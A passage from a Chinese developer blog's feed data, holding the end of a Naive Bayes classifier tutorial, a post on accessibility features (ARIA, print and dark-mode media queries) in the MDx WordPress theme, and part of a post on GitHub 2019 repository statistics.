#计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a 